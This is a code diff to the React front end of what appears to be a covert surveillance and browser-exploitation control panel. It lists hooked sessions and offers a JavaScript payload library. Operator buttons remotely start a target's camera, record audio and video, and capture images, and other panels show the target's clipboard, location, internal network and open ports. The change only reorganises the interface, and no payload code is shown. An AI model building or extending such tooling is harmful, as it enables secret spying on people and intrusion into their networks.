@@ -157,38 +157,41 @@ export default function LiveTrackerPage() {
       
       <div className="grid grid-cols-1 xl:grid-cols-3 gap-6 items-start">
         <div className="xl:col-span-2 flex flex-col gap-6">
-          <LiveTracker sessions={sessionsMap} selectedSessionId={selectedSessionId} />
+          <LiveTracker sessions={sessionsMap} setSessions={setSessionsFromMap} selectedSessionId={selectedSessionId} setSelectedSessionId={setSelectedSessionId} resetState={resetState}/>
           <JavaScriptLibrary onSelectPayload={handleSelectPayload}/>
         </div>
         <div className="xl:col-span-1 flex flex-col gap-6">
-          <SessionHistory sessions={sessionsMap} setSessions={setSessionsFromMap} selectedSessionId={selectedSessionId} setSelectedSessionId={setSelectedSessionId} resetState={resetStateForSession} />
+          <SessionHistory sessions={sessionsMap} setSessions={setSessionsFromMap} selectedSessionId={selectedSessionId} setSelectedSessionId={setSelectedSessionId} resetState={resetState} />
           
-           <Card className="bg-primary/10">
-            <CardHeader>
-                <CardTitle className="text-lg flex items-center gap-2"><Video className="h-5 w-5"/> Media Control</CardTitle>
-                 {(isCameraActive || isMicActive) && <Badge variant="destructive" className="w-fit"><Webcam className="mr-2 h-4 w-4"/> LIVE</Badge>}
-            </CardHeader>
-            <CardContent className="space-y-4">
-                <div className="w-full aspect-video rounded-md bg-black flex items-center justify-center">
-                    {liveFeedSrc ? <Image src={liveFeedSrc} alt="Live feed" width={640} height={480} className="w-full h-full object-contain"/> : <p className="text-muted-foreground text-sm">{selectedSessionId ? 'Camera feed inactive.' : 'Select a session.'}</p>}
-                </div>
-                <div className="grid grid-cols-2 gap-2">
-                    <Button onClick={() => sendCommandToSession('start-video')} disabled={!selectedSessionId || isCameraActive}>Start Camera</Button>
-                    <Button onClick={() => sendCommandToSession('stop-stream')} disabled={!isCameraActive && !isMicActive} variant="destructive">Stop Stream</Button>
-                    <Button onClick={() => handleRecording('video')} disabled={!isCameraActive || isRecording === 'video'}>Record Video</Button>
-                    <Button onClick={() => handleRecording('audio')} disabled={!isMicActive || isRecording === 'audio'}>Record Audio</Button>
-                    <Button onClick={handleStopRecording} disabled={!isRecording} variant="destructive" className="col-span-2">Stop Recording</Button>
-                    <Button onClick={() => sendCommandToSession('capture-image')} disabled={!isCameraActive} className="col-span-2">Capture Image</Button>
-                </div>
-            </CardContent>
-        </Card>
+          {selectedSessionId && (
+            <Card className="bg-primary/10">
+              <CardHeader>
+                  <CardTitle className="text-lg flex items-center gap-2"><Video className="h-5 w-5"/> Media Control</CardTitle>
+                  {(isCameraActive || isMicActive) && <Badge variant="destructive" className="w-fit"><Webcam className="mr-2 h-4 w-4"/> LIVE</Badge>}
+              </CardHeader>
+              <CardContent className="space-y-4">
+                  <div className="w-full aspect-video rounded-md bg-black flex items-center justify-center">
+                      {liveFeedSrc ? <Image src={liveFeedSrc} alt="Live feed" width={640} height={480} className="w-full h-full object-contain"/> : <p className="text-muted-foreground text-sm">Camera feed inactive.</p>}
+                  </div>
+                  <div className="grid grid-cols-2 gap-2">
+                      <Button onClick={() => sendCommandToSession('start-video')} disabled={!selectedSessionId || isCameraActive}>Start Camera</Button>
+                      <Button onClick={() => sendCommandToSession('stop-stream')} disabled={!isCameraActive && !isMicActive} variant="destructive">Stop Stream</Button>
+                      <Button onClick={() => handleRecording('video')} disabled={!isCameraActive || isRecording === 'video'}>Record Video</Button>
+                      <Button onClick={() => handleRecording('audio')} disabled={!isMicActive || isRecording === 'audio'}>Record Audio</Button>
+                      <Button onClick={handleStopRecording} disabled={!isRecording} variant="destructive" className="col-span-2">Stop Recording</Button>
+                      <Button onClick={() => sendCommandToSession('capture-image')} disabled={!isCameraActive} className="col-span-2">Capture Image</Button>
+                  </div>
+              </CardContent>
+            </Card>
+          )}
 
-          <InternalNetworkScannerResults ips={internalIps} />
-          <PortScannerResults ports={openPorts} />
-          <ClipboardMonitor content={clipboardContent} />
-          <LocationTracker location={location} />
+          {internalIps.length > 0 && <InternalNetworkScannerResults ips={internalIps} />}
+          {openPorts.length > 0 && <PortScannerResults ports={openPorts} />}
+          {clipboardContent && <ClipboardMonitor content={clipboardContent} />}
+          {location && <LocationTracker location={location} />}
         </div>
       </div>
     </div>
   );
 }
+
